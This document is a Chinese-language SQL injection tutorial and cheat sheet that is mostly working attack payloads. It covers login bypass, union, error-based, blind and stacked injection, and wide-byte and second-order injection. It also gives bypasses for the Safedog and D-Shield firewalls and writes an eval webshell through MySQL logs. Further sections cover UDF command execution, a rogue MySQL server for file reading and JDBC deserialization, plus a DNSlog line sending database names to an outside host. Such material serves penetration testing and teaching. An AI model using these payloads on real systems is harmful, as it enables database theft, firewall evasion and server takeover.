## 一、 Sql注入是什么？如何产生的？危害有哪些？

现在的web大多是前后端分离，在固定前端页面上，通过不同参数去调用数据库的内容而显示不一样内容。这种情况下传入恶意参数，通过拼接在sql语句上，导致攻击者可以操作数据库，获得敏感数据或者直接命令执行，危害极大。
最常见的sql注入。

```
http://127.0.0.1/news.php?id=1
select * from news where id = $id;
http://127.0.0.1/news.php?id=1 and 1=1
select * from news where id = 1 and 1=1

```

### 绕过登录：

本来需要执行的sql语句

```
SELECT USER from database WHERE username =$username AND password =$password
```

```vhdl
username:a or 1=1--
password:blank
```

所以，这会使我们的查询为：

```php
<?php
SELECT USER from database WHERE username='a' or 1=1-- AND password=''  
```

请注意 - 是注释运算符，其后的任何内容都将被忽略为注释。 存在另一个注释运算符，它是/ *。

所以我们的上述查询变为：

```vbnet
<?php
SELECT USER from database WHERE username='a' or 1=1  
```

现在，即使没有名为“a”的用户，此查询也会生效

### 删除数据库

```
// 设定$name 中插入了我们不需要的SQL语句
$name = "Qadir'; DELETE FROM users;";
mysqli_query($conn, "SELECT * FROM users WHERE name='{$name}'");


->SELECT * FROM users WHERE name='Qadir'; DELETE FROM users;
```


## 二、 SQL注入有多少种？

从回显内容上来看，SQL注入只分为联合注入，报错注入，盲注，堆叠注入。

### 1，联合注入

在联合注入中是使用了union select联合查询，通常用来拼接在where后面，如下。

```
http://127.0.0.1/news.php?id=1
http://127.0.0.1/news.php?id=1 order by 4
http://127.0.0.1/news.php?id=-1 union select 1,2,3,4
http://127.0.0.1/news.php?id=-1 union select user(),2,3,4
```

sql语句为。

```
select * from news where id = $id;
select * from news where id = 1 order by 4
select * from news where id = -1 union select 1,2,3,4
select * from news where id = -1 union select user(),2,3,4
```

进而爆库，表，列，值。

```
select * from news where id = -1 union select database(),2,3,4
select * from news where id = -1 union select group_concat(schema_name),2,3,4  from information_schema.schemata
select * from news where id = -1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()
select * from news where id = -1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()
select * from news where id = -1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name= 'user' and table_schema=database()
select * from news where id = -1 union select group_concat(password),2,3,4 from user
```

联合注入的优势是自带多个显位，可以很快爆出数据，缺点是只能用在select最后处，后面如果还有sql语句就必须注释掉。而且必须用到union和select，很容易被拦截。

### 2，报错注入

经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()

```
id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
2.extractvalue()
id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
3.updatexml()
id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
4.geometrycollection()
id=1 and geometrycollection((select * from(select * from(select user())a)b));
5.multipoint()
id=1 and multipoint((select * from(select * from(select user())a)b));
6.polygon()
id=1 and polygon((select * from(select * from(select user())a)b));
7.multipolygon()
id=1 and multipolygon((select * from(select * from(select user())a)b));
8.linestring()
id=1 and linestring((select * from(select * from(select user())a)b));
9.multilinestring()
id=1 and multilinestring((select * from(select * from(select user())a)b));
10.exp()
id=1 and exp(~(select * from(select user())a));
```

报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。缺点是必须开启错误提示——mysqli_error()

### 3，盲注

盲注又分为布尔盲注，时间盲注，dnslog盲注
 **布尔盲注** ，以页面回显的内容的不同作为判定依据。

```
id=1 and 1=1
id=1 and 1=2
id=1 and user()='root@localhost'
id=1 and substr((select user()),1,1)= 'r'
id=1 and ascii(substr((select user()),1,1))= 114
```

 **时间盲注** ，以回显的时间长短作为判断依旧

```
id=1 and sleep(2)
id=1 and if((substr((select user()),1,1)= 'r'),sleep(2),1)
```

 **dnslog盲注** ，必须windows系统，必须root权限，必须secure_file_priv为空

```
id=2 and 1=(select load_file(concat('\\\\',hex(database()),'.pk4qft.dnslog.cn\\test')))
```

盲注在于无法构造出回显位时使用，优点是适配绝大部分注入点，缺点是注入繁琐，费时费力，高频率对服务器发起访问也容易被ban。

### 4，堆叠注入

堆叠注入在mysql上不常见，必须要用到mysqli_multi_query()或者PDO，可以用分号分割来执行多个语句，相当于可直连数据库。Mssql则较常见堆叠注入。

```
id=1;select user();
```

堆叠注入非常危险，通常sql注入有诸多限制，比如只能查不能增删改，不能更改数据库设置，而堆叠注入相当于获取了数据库密码进行直连，直接操作数据库。

### 5，参数类型分类

从参数的类型上来看，sql注入分为数字型和字符型。
参数如果是数字，开发通常不会用单引号包裹，参数如果是字符，开发喜欢用单引号包裹。所以数字型和字符型决定了注入时是否必须使用单引号。

```
id=1 and 1=1
id=a'and 1=1 and 'q'='q
```

数字型注入还可以利用数字的增减操作进行布尔盲注，以避免使用and or等敏感词， **数字增减注入是证明存在注入而绝对不会被waf拦截的注入姿势** 。

```
id=3-1
id=1%2b1
```

但这并不绝对，比如dvwa的注入是数字型的，却用了单引号包裹。还有的时候还需要用双引号，圆括号逃逸。

```
id=1'and 1='1
id=1"and 1="1
id=1)and(1=1
id=1')and(1='1
```

### 6，SQL拼接位置分类

从sql注入拼接的位置，还可以分为where注入，order by 注入，limit注入，values注入等。
1，where注入，上述所有的都是where注入。

```
select * from news where id = $id and data < '$data';
select * from news where id = 1 and 1=1 and data < 'test'and 1='1';
delete from user where id =$id;
delete from user where id =1 and 1=1;
```

2，order by 注入

```
select * from user order by $id;
select * from user order by 1 desc/asc
select * from user order by sleep(2);
select * from user order by rand(1=2);
select * from user order by updatexml(1,concat(0x7e,(select user()),0x7e),1);
```

3，limit注入

```
select * from user limit $limit, $size
select * from user limit 1 into @,@,@,@;
select * from user limit 1 into outfile 'D://1.txt';
select * from user limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,user())),1);
select * from user limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,(IF(mid(user(),1,1) LIKE 'r', BENCHMARK(5000000,SHA1(1)),1)))),1);
```

4，values注入

```
insert into `test`.`log`(`log`) VALUES('$log');
insert into `test`.`log`(`log`) VALUES('testsetset'or sleep(5)) # ');
insert into `test`.`log`(`log`) VALUES('testsetset' and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # ')
insert into `test`.`log`(`log`) VALUES('1'+if((1=1),sleep(2),1)) # ')
```

5，table_name注入

```
select * from $table_name where id =1
select * from (select * from user) as a where id =1
```

还可以根据注入位置分类，GET，POST，cookie，header

## 三、 宽字节注入和二次注入

### 1，宽字节注入

字符型注入需要逃逸单引号，php提供了魔术引号开关magic_quotes_gpc和addslashes()函数作为防御，其特点是自动给传入的参数单引号，双引号，反斜杠，%00前面加一个反斜杠，进行转义。这样就无法逃逸单引号。

```
Select * from user where id='$id';
Select * from user where id='1\'and 1=\'1';
```

但是，如果数据库是GBK格式而非默认的UTF-8，则可以利用%df%27进行单引号逃逸。

```
%df%27===(addslashes)===>%df%5c%27===(iconv)===>%e5%5c%5c%27
Select * from user where id='1縗'and sleep(2) # '
```

### 2，二次注入

二次注入本质上是，sql语句使用的变量不是直接传入的变量。
部分网站在代码层面上对sql注入的防御通常是写一个无敌的过滤器出来，自定义为安全函数。然后所有用户传入的参数都经过这个安全函数处理。
此时，可能用户传入的某些参数并不直接与SQL交互，被存储在本地文件当中，比如一些keys，所以未经安全函数处理。
但是一些没有经过用户传参的sql语句，却有可能调用这些未经安全函数处理的keys，如果keys被插入恶意语句，则产生了二次注入。
用户=>参数a=>安全处理=>sql语句=>参数a被存储
无需传参的web页面=>其他sql语句=>调用参数a=>二次注入
比如注册一个用户名为 **admin' #** 的用户，注册时并无SQL注入，修改密码时的SQL语句为。

```
update user set password='$password' where username='admin' #'
```

导致越权修改了admin的密码。
由于二次注入利用链比较长，更容易被开发忽视，但往往黑盒很难测试出来，需要代码审计。

## 四、 Mysql的tips

### 用一些自带函数来探测显位

```
system_user() //系统用户名
user() //用户名
current_user //当前用户名
session_user() //连接数据库的用户名
database() //数据库名
version() //MYSQL数据库版本
@@datadir //读取数据库路径
@@basedir //MYSQL 安装路径
@@version_compile_os //操作系统
```

### 空白符和注释

在HTTP传参中，【%20】【 】【+】都是空格，【%2b】是加号
在mysql当中，%09 %0A %0B %0C %0D都是空白符，效果和%20一样，linux可能还支持%A0
同时，一些特殊符号，注释，括号也可以充当空白符。
注释有四种

```
select user() # adfadsf
select user() -- adfadsf
select/*asfdasf*/user()
/*!50000Select*/user()
```

内联注释50000表示版本号，还可以这样用

```
select/*adsafsadf/*asfdasf*/user()
select user()/*!50000union/*!50000select*/database()
```

--和#只能注释一行，如果SQL语句有换行则注释会报错。此外，还有%00;可以起到类似注释的效果

```
select * from user where id = 1 and 1=1 --
order by id
```

利用特殊符号充当空白符

```
select*from`user`where id=.1union select+1,2,3,\Nfrom`users`;
select*from`user`where+id=1e0union/**/select+1,2,3,database/**/()select+1;
select-1;
select~1;
select!1;
select@1;
select'1';
select"1";
select(1);
select{x 1}from{x user}
```

### 运算符

and为逻辑运算符，可被 or xor not代替，同时and= **&&** or= **||** xor= **^** not=**!**
select * from user where not(0=1);
数字型注入时，可以不用逻辑运算，用数字运算。+ - * / div mod

```
select 2-(select 1)
select 4 div(select 3)
```

盲注时，可以用比较运算符，**= <> != % between not between in not in LIKE REGEXP RLIKE**

```
select user()%sleep(1)
(select ascii(substr((select user()),1,1)))=114
select ascii(substr((select user()),1,1)) between 113 and 115
select ascii(substr((select user()),1,1)) in (114)
select user() like 'root%'
select user() regexp 0x5E726F6F5B612D7A5D --0x5E726F6F5B612D7A5D=^roo[a-z]
```

也可以用字符串比较函数

```
select strcmp(user(),'root@localhost')
select find_in_set(1,1)
```

### 联合注入的技巧

union select可用 **union all select** / **union distinct select** /**union distinctrow select**代替
order by 可用**group by**代替
字符串连接函数用法

```
select username from user limit 0,1
select group_concat(username) from user
select concat_ws('_',username,password) from user
select concat(username,'_',password) from user
```

联合注入有时候必须要用null填充显位(常见于mssql)

### 文件读取和导出

**outfile**和 **dumpfile** ，必须root，必须开启secure_file_priv，必须有绝对路径，必须拼接在select最后，必须可以使用单引号。如果无法控制查询最终内容，outfile可拼接如下4个。
**lines terminated by**
**lines starting by**
**fields terminated by**
**columns terminated by **

```
select * from user where id=1 union select 1,'<?php phpinfo();>',3,4 into dumpfile 'D://1.php'
select * from user where id =1 order by 1 limit 0,1 into outfile 'D://1.php' lines terminated by '<?php phpinfo();>'
```

 **load_file** , 必须root，必须开启secure_file_priv，必须有绝对路径

```
select load_file('D://1.php')
```

不用单引号

```
select 'root'
select char(114,111,111,116)
select 0x726F6F74
```

### 盲注的技巧

盲注一般先看长度

```
id=4 and length(user())=14
```

布尔盲注的方法，substr，substring，mid，left，right截取单个字符

```
id=4 and substr((select user()),1,1)=0x72
id=4 and left((select user()),1)=0x72
```

用ascii()，ord()，hex()编码单个字符

```
id=4 and ascii(substring((select user()) from 1 for 1))=114
id=4 and ord(mid((select user()),1,1))=114
id=4 and hex(right((select user()),1))=74
```

用if，ifnull，case when做盲注的真假条件并自由输出字符

```
id=4 and if(1=1,1,0)
id=4 and ifnull(1=1,0)
id=4 and (case when 1=1 then 1 else 0 end)
```

时间盲注，用sleep(2)代替布尔盲注的1，类似函数有 **benchmark(50000000,sha(1))** 和**(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C)**

```
id=4 and if(substr((select user()),1,1)=0x72,sleep(2),0)
id=4 and if(substr((select user()),1,1)=0x72, (select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C),0)
```

如果查询是空内容，同时传入两个值使其报错来构成布尔盲注

```
select null and 1=(case when 1=1 then (select 666) else (select 666 union select 667)end)
select null and 1=(case when 1=1 then (select 666) else exp(999999999)end)
```

### 其他一些tips

不使用逗号的几种情况。

```
select * from user limit 1 offset 0
select substr((select user()) from 1 for 1)=0x72
select * from user where id=1 union select * from (select 1)a join (select 2)b join(select 3)c join (select user())d
```

在不知道列名的情况下联合查询数据，原理是将列名替换成1234

```
select 1,2,3,4 union select * from user
select * from user where id =-1 union select 1,(select `3` from (select 1,2,3,4 union select * from user)a limit 1,1),3,4
```

堆叠注入无select

```
set @a = 0x73656C65637420757365722829;PREPARE b FROM @a;EXECUTE b;
```

盲注无select，只能注同表的列

```
select * from user where id = 1 and mid((username)from(1)for(1))='a'
```

### 高版本的一些tips

在mysql5.7版本，新增了sys公共库，使得我们可以在information被过滤了之后使用sys库里的一些表来查询库和表

```
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='test' GROUP BY table_name;
SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='test' GROUP BY table_name;
```

mysql8.0.21之后，增加**table**和**information_schema.TABLESPACES_EXTENSIONS**

```
(table information_schema.TABLESPACES_EXTENSIONS limit 0,1)
```

增加values

```
select 1,2,3 where 1 = 1 union values row(1,2,3)
```

## 五、 绕安全狗

**注：写文章时有效，现在已失效，但是可以作为参考**

```
http://www.safedog.cn/index/dataSolutionIndex.html?tab=2 %26%26 -1=-1
```

万能绕过方法，构造 **a=/*&tab=payload&b=*/** ，欺骗payload在注释中。

```
a=/*&tab=union select group_concat(schema_name),2,3 from information_schema.schemata&b=*/
```

联合注入绕过
其对内联注释含44的版本检测力度较轻

```
/*!11440order/by 1
```

发现其对/**/内不检测，用%0A欺骗select在/**/中，在函数和圆括号中加注释绕过对函数的拦截

```
database/**/()
/*!11441union*/-- /*%0Aselect/**/database/**/()
```

%0A绕过对information_schema的拦截

```
/*!11441union*/-- /*%0Aselect/**/ group_concat(table_name) from information_schema%0A.tables
```

报错注入绕过
反引号包裹函数，同类函数替换

```
and `updatexml`(1,concat(0x7e,(select current_user),0x7e),1)
```

时间盲注绕过，冷门函数

```
and elt((substr((select current_user),1,1)=0x72)*2,1,sleep/**/(2))
```

## 六、 绕D盾

```
http://www.d99net.net/News.asp?id=105 and true
```

D盾无法使用/**/，单引号，但当传参超过100位时，取消对单引号屏蔽

```
http://www.d99net.net/News.asp?id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27
```

几乎无法使用select

```
%26%26 ord(right(user(),1))=116
```

## 七、 直连mysql或者堆叠注入的危害

### 1，log写入shell

```
show global variables like '%general_log%';
set global general_log=on;
set global general_log_file='D://x.php';
select "<?php eval($_POST['x']) ?>";
set global general_log=off;
```

```
show global variables like '%query_log%';
set global slow_query_log=on;
set global slow_query_log_file='D://x.php';
show variables like '%log%';
select '<?php phpinfo();?>' from mysql.db where sleep(2);
set global slow_query_log=off;
```

### 2，udf提权

```
select @@basedir;
show variables like '%plugins%';
create function cmdshell returns string soname 'udf.dll';
select cmdshell('whoami');
select * from mysql.func;
delete from mysql.func where name='cmdshell';
```

[https://github.com/luoke90hou/files/blob/main/mysqludflinux.txt](https://github.com/luoke90hou/files/blob/main/mysqludflinux.txt)

[https://github.com/luoke90hou/files/blob/main/mysqludfwindows.txt](https://github.com/luoke90hou/files/blob/main/mysqludfwindows.txt)

## 八、恶意mysql

有时候可以控制别人的服务器去连接任意mysql服务器。

比如phpmyadmin，Adminer，thinkphp3.2.3反序列化，后台配置等等。

thinkphp3.2.3反序列化见

[https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)

### 1，php连接恶意mysql——任意文件读取

[https://github.com/Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)

下载脚本，在恶意服务器上新增filelist

![1611202432_6008ff803ce01e69d76e1.png!small](https://image.3001.net/images/20210121/1611202432_6008ff803ce01e69d76e1.png!small)

用navicat连接

![1611202456_6008ff9856f84c28fc29b.png!small?1611202989465](https://image.3001.net/images/20210121/1611202456_6008ff9856f84c28fc29b.png!small?1611202989465)

读取文件成功

![1611202484_6008ffb4dc40269b08c44.png!small](https://image.3001.net/images/20210121/1611202484_6008ffb4dc40269b08c44.png!small)

### 2，java连接恶意mysql——反序列化

此为mysql8.0漏洞，需要找到一个可以控制jdbc的点。本地测试要CC链和mysql-connector-java-8.0.11.jar

详情见[https://xz.aliyun.com/t/8159](https://xz.aliyun.com/t/8159)

```
package test;
import java.sql.*;

public class Test {
    public static void main(String[] args) throws Exception{
        String driver = "com.mysql.jdbc.Driver";//com.mysql.jdbc.Driver
        String DB_URL = "jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    }
}
```

![1611202870_600901364c8109985f207.png!small?1611203403516](https://image.3001.net/images/20210121/1611202870_600901364c8109985f207.png!small?1611203403516)
